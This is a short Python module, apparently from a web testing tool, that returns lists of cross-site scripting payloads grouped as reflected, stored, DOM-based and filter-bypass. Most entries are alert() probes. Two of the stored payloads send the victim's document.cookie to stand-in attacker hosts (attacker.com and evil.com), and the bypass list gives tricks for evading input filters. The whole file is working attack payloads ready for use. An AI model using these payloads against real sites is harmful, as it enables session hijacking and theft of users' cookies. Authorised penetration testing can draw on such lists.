# XSS Payload Module
# Contributed by Osama - July 2025

def get_reflected_payloads():
    return [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '\"><script>alert(1)</script>',
    ]

def get_stored_payloads():
    return [
        '<script>fetch("http://attacker.com?cookie="+document.cookie)</script>',
        '<img src="x" onerror="document.location=`http://evil.com?xss=`+document.cookie">',
        '<iframe srcdoc="<script>alert(1)</script>">',
    ]

def get_dom_payloads():
    return [
        '<input autofocus onfocus=alert(1)>',
        '<a href="#" onclick="alert(1)">Click</a>',
        '<body onload=alert(1)>',
        '<script>document.write(location.hash)</script>',
    ]

def get_bypass_payloads():
    return [
        '<svg><script>confirm(1)</script>',
        '<iframe srcdoc="<script>alert`1`</script>">',
        '<img src=x%00 onerror=alert(1)>',
        '<svg/onload=alert`1`>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
    ]

def get_all_payloads():
    """
    Returns all XSS payloads: reflected, stored, DOM-based, and bypass.
    """
    return (
        get_reflected_payloads()
        + get_stored_payloads()
        + get_dom_payloads()
        + get_bypass_payloads()
    )
